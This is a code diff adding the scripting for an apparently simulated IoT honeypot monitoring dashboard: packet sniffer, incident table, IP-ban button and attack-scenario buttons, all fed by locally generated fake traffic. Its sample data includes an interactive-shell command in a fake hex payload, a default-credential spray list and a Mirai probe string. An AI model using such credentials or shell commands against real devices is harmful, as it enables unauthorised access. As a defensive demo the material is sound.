+      const size = Math.floor(Math.random() * 800 + 64);
+      const now = new Date();
+      const timestamp = now.toTimeString().split(' ')[0] + '.' + String(now.getMilliseconds()).padStart(3, '0');
+
+      return {
+        id: packetStream.length + 1,
+        time: timestamp,
+        src: src,
+        dst: dst,
+        proto: proto,
+        port: port,
+        size: size,
+        isAnomaly: isAnomaly,
+        flag: isAnomaly ? 'ANOMALY_DETECTED' : 'SYN_ACK',
+        hexPayload: isAnomaly 
+          ? '0000  41 44 4d 49 4e 3a 41 44 4d 49 4e 0d 0a 53 59 53  ADMIN:ADMIN..SYS\n0010  54 58 45 43 20 2f 62 69 6e 2f 73 68 20 2d 69 00  EXEC /bin/sh -i.'
+          : '0000  10 1a 00 04 4d 51 54 54 04 02 00 3c 00 0c 73 6d  ....MQTT...<..sm\n0010  61 72 74 2d 62 75 6c 62 2d 30 31 00 00 00 00 00  art-bulb-01.....'
+      };
+    }
+
+    function addPacketToStream(pkt) {
+      packetStream.unshift(pkt);
+      if (packetStream.length > 50) packetStream.pop();
+      renderSnifferTable();
+    }
+
+    function renderSnifferTable() {
+      const tbody = document.getElementById('packet-table-body');
+      if (!tbody) return;
+
+      const filterProto = document.getElementById('filter-proto').value;
+      const filterAnomaly = document.getElementById('filter-anomaly').value;
+      const search = document.getElementById('filter-search').value.toLowerCase();
+
+      const filtered = packetStream.filter(p => {
+        if (filterProto !== 'ALL' && p.proto !== filterProto) return false;
+        if (filterAnomaly === 'ANOMALY' && !p.isAnomaly) return false;
+        if (filterAnomaly === 'NORMAL' && p.isAnomaly) return false;
+        if (search && !p.src.includes(search) && !p.dst.includes(search) && !String(p.port).includes(search)) return false;
+        return true;
+      });
+
+      tbody.innerHTML = filtered.map(p => `
+        <tr onclick="inspectPacket(${p.id})" class="packet-row cursor-pointer border-b border-slate-800/40 hover:bg-slate-800/50">
+          <td class="p-2.5 text-slate-500">#${p.id}</td>
+          <td class="p-2.5 text-slate-300">${p.time}</td>
+          <td class="p-2.5 font-mono ${p.isAnomaly ? 'text-rose-400 font-bold' : 'text-slate-300'}">${p.src}</td>
+          <td class="p-2.5 font-mono text-slate-300">${p.dst}</td>
+          <td class="p-2.5"><span class="px-1.5 py-0.5 bg-slate-800 rounded text-cyan-300 text-xs">${p.proto}</span></td>
+          <td class="p-2.5 text-slate-400">${p.port}</td>
+          <td class="p-2.5 text-slate-400">${p.size} B</td>
+          <td class="p-2.5">${p.isAnomaly 
+            ? `<span class="px-2 py-0.5 bg-rose-500/20 text-rose-400 border border-rose-500/30 rounded">SUSPICIOUS</span>` 
+            : `<span class="px-2 py-0.5 bg-emerald-500/10 text-emerald-400 rounded">OK</span>`}</td>
+        </tr>
+      `).join('');
+    }
+
+    function applyPacketFilters() {
+      renderSnifferTable();
+    }
+
+    function clearSnifferLog() {
+      packetStream = [];
+      renderSnifferTable();
+    }
+
+    function inspectPacket(pktId) {
+      const pkt = packetStream.find(p => p.id === pktId);
+      if (!pkt) return;
+
+      document.getElementById('dpi-pkt-id').innerText = `Packet #${pkt.id} [${pkt.proto}]`;
+      document.getElementById('dpi-ip').innerText = `Src: ${pkt.src} -> Dst: ${pkt.dst}`;
+      document.getElementById('dpi-proto').innerText = `${pkt.proto} (Port ${pkt.port}) Size=${pkt.size}B`;
+      document.getElementById('dpi-hex').innerText = pkt.hexPayload;
+      document.getElementById('dpi-anomaly-score').innerText = pkt.isAnomaly ? 'Anomaly Confidence: 96%' : 'Anomaly Confidence: 2%';
+      document.getElementById('dpi-summary').innerText = pkt.isAnomaly 
+        ? 'Deep Packet Inspection identified unauthorized brute-force shell attempt on IoT honeypot service.' 
+        : 'Standard telemetry heartbeat payload matching benign device specification.';
+    }
+
+    /* ==========================================================================
+       6. SIEM & INCIDENT MANAGEMENT
+       ========================================================================== */
+    function renderSiemTable() {
+      const tbody = document.getElementById('siem-table-body');
+      if (!tbody) return;
+
+      tbody.innerHTML = attackLogs.map(log => `
+        <tr class="border-b border-slate-800/60 hover:bg-slate-900/50">
+          <td class="p-3 text-cyan-400 font-bold">${log.id}</td>
+          <td class="p-3 text-slate-400">${log.time}</td>
+          <td class="p-3">
+            <span class="px-2 py-0.5 text-xs font-bold ${log.severity === 'CRITICAL' ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30' : log.severity === 'WARNING' ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30' : 'bg-cyan-500/20 text-cyan-400'} rounded">
+              ${log.severity}
+            </span>
+          </td>
+          <td class="p-3 text-slate-200">${log.type}</td>
+          <td class="p-3 text-rose-400 font-mono">${log.ip}</td>
+          <td class="p-3 text-slate-300">${log.target}</td>
+          <td class="p-3"><span class="px-2 py-0.5 bg-emerald-500/10 text-emerald-400 rounded">${log.action}</span></td>
+          <td class="p-3">
+            <button onclick="openSiemModal('${log.id}')" class="px-2.5 py-1 bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 rounded text-xs transition">
+              Investigate
+            </button>
+          </td>
+        </tr>
+      `).join('');
+
+      // Also update dashboard feed table
+      const dashBody = document.getElementById('dash-feed-body');
+      if (dashBody) {
+        dashBody.innerHTML = attackLogs.slice(0, 5).map(log => `
+          <tr class="hover:bg-slate-900/50">
+            <td class="p-3 text-slate-400">${log.time}</td>
+            <td class="p-3 text-rose-400 font-bold">${log.ip}</td>
+            <td class="p-3 text-slate-300">${log.target}</td>
+            <td class="p-3 text-slate-400">${log.service}</td>
+            <td class="p-3 text-slate-200">${log.type}</td>
+            <td class="p-3"><span class="px-2 py-0.5 text-xs ${log.severity === 'CRITICAL' ? 'bg-rose-500/20 text-rose-400' : 'bg-amber-500/20 text-amber-400'} rounded">${log.severity}</span></td>
+            <td class="p-3 text-emerald-400">${log.action}</td>
+          </tr>
+        `).join('');
+      }
+    }
+
+    let currentSiemLogId = null;
+
+    function openSiemModal(logId) {
+      currentSiemLogId = logId;
+      const log = attackLogs.find(l => l.id === logId);
+      if (!log) return;
+
+      document.getElementById('siem-modal').classList.remove('hidden');
+      document.getElementById('siem-modal-title').innerText = `Incident Investigation #${log.id}`;
+      document.getElementById('siem-modal-ip').innerText = log.ip;
+      document.getElementById('siem-modal-node').innerText = log.target;
+      document.getElementById('siem-modal-vector').innerText = log.type;
+      document.getElementById('siem-modal-payload').innerText = log.payload;
+    }
+
+    function closeSiemModal() {
+      document.getElementById('siem-modal').classList.add('hidden');
+    }
+
+    function executeIpBan() {
+      if (!currentSiemLogId) return;
+      const log = attackLogs.find(l => l.id === currentSiemLogId);
+      if (log) {
+        log.action = 'IP Blacklisted in Firewall';
+        renderSiemTable();
+        alert(`Source IP [${log.ip}] has been blacklisted across the IoT Deception Network.`);
+        closeSiemModal();
+      }
+    }
+
+    function filterSiemEvents() {
+      renderSiemTable();
+    }
+
+    /* ==========================================================================
+       THEME PREFERENCE
+       ========================================================================== */
+    function applyTheme(theme) {
+      const isLight = theme === 'light';
+      document.body.classList.toggle('theme-light', isLight);
+      document.documentElement.classList.toggle('dark', !isLight);
+      document.documentElement.classList.toggle('light', isLight);
+
+      const icon = document.getElementById('theme-icon');
+      const label = document.getElementById('theme-label');
+      const toggle = document.getElementById('theme-toggle');
+      if (icon) icon.className = `fa-solid ${isLight ? 'fa-moon' : 'fa-sun'} theme-icon`;
+      if (label) label.innerText = isLight ? 'Dark' : 'Light';
+      if (toggle) {
+        toggle.title = isLight ? 'Switch to dark theme' : 'Switch to light theme';
+        toggle.setAttribute('aria-label', toggle.title);
+      }
+
+      localStorage.setItem('iot-soc-theme', theme);
+      updateChartTheme(isLight);
+    }
+
+    function toggleTheme() {
+      const next = document.body.classList.contains('theme-light') ? 'dark' : 'light';
+      applyTheme(next);
+    }
+
+    function updateChartTheme(isLight) {
+      const text = isLight ? '#475569' : '#94a3b8';
+      const grid = isLight ? 'rgba(15,23,42,0.08)' : 'rgba(255,255,255,0.05)';
+      [trafficChartInstance, honeypotBarChartInstance].forEach(chart => {
+        if (!chart) return;
+        if (chart.options.scales) {
+          Object.values(chart.options.scales).forEach(scale => {
+            if (scale.ticks) scale.ticks.color = text;
+            if (scale.grid) scale.grid.color = grid;
+          });
+        }
+        if (chart.options.plugins?.legend?.labels) chart.options.plugins.legend.labels.color = text;
+        chart.update('none');
+      });
+    }
+
+    function initializeTheme() {
+      const saved = localStorage.getItem('iot-soc-theme');
+      const preferred = saved || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
+      applyTheme(preferred);
+    }
+
+    /* ==========================================================================
+       7. INTERACTIVE ATTACK SIMULATOR & LOOP
+       ========================================================================== */
+    function triggerAttackScenario(type) {
+      totalThreats += 1;
+      document.getElementById('kpi-threat-count').innerText = totalThreats;
+
+      let newLog = null;
+      if (type === 'PORT_SCAN') {
+        newLog = {
+          id: `INC-${Math.floor(8900 + Math.random() * 1000)}`,
+          time: new Date().toTimeString().split(' ')[0],
+          ip: '103.251.167.8',
+          target: 'All Deception Nodes',
+          service: 'Multi-Port (21-8080)',
+          type: 'Nmap TCP SYN Sweep',
+          severity: 'WARNING',
+          action: 'Honeypot Trap Triggered',
+          payload: 'SYN SCAN [Ports 21, 22, 23, 80, 554, 1883]'
+        };
+      } else if (type === 'BRUTE_FORCE') {
+        newLog = {
+          id: `INC-${Math.floor(8900 + Math.random() * 1000)}`,
+          time: new Date().toTimeString().split(' ')[0],
+          ip: '185.220.101.5',
+          target: 'Smart Camera (192.168.1.101)',
+          service: 'Telnet (23)',
+          type: 'Telnet Credential Spray',
+          severity: 'CRITICAL',
+          action: 'Captured & Quarantined',
+          payload: 'AUTH TRY: admin/admin, root/root, support/support'
+        };
+        // Highlight camera node
+        const camera = iotNodes.find(n => n.id === 'node-1');
+        if (camera) {
+          camera.status = 'attack';
+          camera.trapped += 5;
+          renderNodes();
+          setTimeout(() => { camera.status = 'active'; renderNodes(); }, 5000);
+        }
+      } else if (type === 'MIRAI') {
+        newLog = {
+          id: `INC-${Math.floor(8900 + Math.random() * 1000)}`,
+          time: new Date().toTimeString().split(' ')[0],
+          ip: '45.142.214.12',
+          target: 'Core IoT Router (192.168.1.1)',
+          service: 'HTTP / Telnet',
+          type: 'Mirai Botnet Probe',
+          severity: 'CRITICAL',
+          action: 'Payload Captured',
+          payload: '/bin/busybox MIRAI_ARM7_PROPAGATION_VECTOR'
+        };
+      } else if (type === 'UDP_FLOOD') {
+        newLog = {
+          id: `INC-${Math.floor(8900 + Math.random() * 1000)}`,
+          time: new Date().toTimeString().split(' ')[0],
+          ip: '198.51.100.44',
+          target: 'Industrial Gateway (192.168.1.200)',
+          service: 'UDP Multi-Port',
+          type: 'UDP Flood Traffic Anomaly',
+          severity: 'CRITICAL',
+          action: 'Rate Limiter Engaged',
+          payload: 'UDP Packet Spike > 1000 pkts/sec'
+        };
+      } else if (type === 'NORMAL_BURST') {
+        for (let i = 0; i < 5; i++) {
+          addPacketToStream(generateRandomPacket());
+        }
+        alert('Injecting normal benign IoT telemetry traffic pulse.');
+        return;
+      }
+
+      if (newLog) {
+        attackLogs.unshift(newLog);
+        renderSiemTable();
+        
+        // Add matching malicious packet to sniffer
+        addPacketToStream({
+          id: packetStream.length + 1,
+          time: newLog.time,
+          src: newLog.ip,
+          dst: '192.168.1.101',
+          proto: 'TCP',
+          port: 23,
+          size: 512,
+          isAnomaly: true,
+          flag: 'CRITICAL_THREAT',
+          hexPayload: '0000  53 59 53 54 45 4d 20 41 54 54 41 43 4b 20 46 49  SYSTEM ATTACK FI\n0010  52 45 44 20 42 59 20 53 49 4d 55 4c 41 54 4f 52  RED BY SIMULATOR'
+        });
+
+        switchTab('dashboard');
+      }
+    }
+
+    function toggleSimulation() {
+      isSimulating = !isSimulating;
+      const btn = document.getElementById('toggle-sim-btn');
+      const icon = document.getElementById('sim-icon');
+      const text = document.getElementById('sim-text');
+
+      if (isSimulating) {
+        icon.className = 'fa-solid fa-pause';
+        text.innerText = 'Pause Engine';
+        btn.classList.replace('bg-emerald-500/20', 'bg-cyan-500/20');
+      } else {
+        icon.className = 'fa-solid fa-play';
+        text.innerText = 'Resume Engine';
+        btn.classList.replace('bg-cyan-500/20', 'bg-emerald-500/20');
+      }
+    }
+
+    /* Simulation Background Loop */
+    setInterval(() => {
+      if (!isSimulating) return;
+
+      // Update counters
+      packetCounter += Math.floor(Math.random() * 5 + 1);
+      document.getElementById('kpi-total-packets').innerText = packetCounter.toLocaleString();
+      document.getElementById('header-pkt-count').innerText = packetCounter.toLocaleString();
+
+      // Push new random packet
+      const pkt = generateRandomPacket();
+      addPacketToStream(pkt);
+
+      // Randomly bump chart
+      if (trafficChartInstance) {
+        const datasets = trafficChartInstance.data.datasets;
+        datasets[0].data.shift();
+        datasets[0].data.push(Math.floor(Math.random() * 20 + 45));
+
+        datasets[1].data.shift();
+        datasets[1].data.push(pkt.isAnomaly ? Math.floor(Math.random() * 30 + 30) : Math.floor(Math.random() * 10));
+
+        trafficChartInstance.update('none');
+      }
+    }, 1500);
+
+    /* ==========================================================================
+       8. ONLOAD BOOTSTRAP
+       ========================================================================== */
+    window.onload = function() {
+      initializeTheme();
+      initCharts();
+      renderNodes();
+      
+      // Populate initial packet stream
+      for (let i = 0; i < 15; i++) {
+        packetStream.push(generateRandomPacket());
+      }
+      renderSnifferTable();
+      renderSiemTable();
+      updateChartTheme(document.body.classList.contains('theme-light'));
+    };
+  </script>
+</body>
+</html>
